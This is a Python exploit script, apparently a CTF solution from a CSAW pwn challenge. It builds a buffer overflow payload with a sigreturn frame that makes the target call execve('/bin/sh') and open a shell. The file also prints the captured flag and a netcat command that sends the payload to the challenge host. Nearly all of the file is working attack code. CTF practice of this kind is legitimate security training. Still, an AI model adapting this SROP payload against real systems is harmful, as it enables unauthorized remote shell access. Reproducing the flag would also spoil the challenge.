#!/usr/bin/python3

# pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git

from pwn import * # Using for easy sigreturn frame
import struct

context.arch = "amd64"

"""
Strategy:
    Buffer overflow to sigreturn gadget @0x400180
    Load all registers to execute syscall
        execve("/bin/sh", 0, 0)
"""

def generate_payload():
    payload = b""
    payload += b"A"*40
    payload += struct.pack("<q", 0x400180) # sigreturn

    frame = SigreturnFrame(kernel="amd64")
    frame.rax = 59
    frame.rdi = 0x4001ca # /bin/sh
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = 0x400158
    frame.rip = 0x4001c5

    payload += bytes(frame)
    payload += b"CCCCCCCC"

    print(len(payload))

    return payload

def main():
    payload = generate_payload()

    with open("exploit.txt", "wb") as payload_file:
        payload_file.write(payload)
    
if __name__ == "__main__":
    main()

# flag{sigrop_pop_pop_pop}
# (cat exploit.txt ; cat) | nc pwn.chal.csaw.io 1002
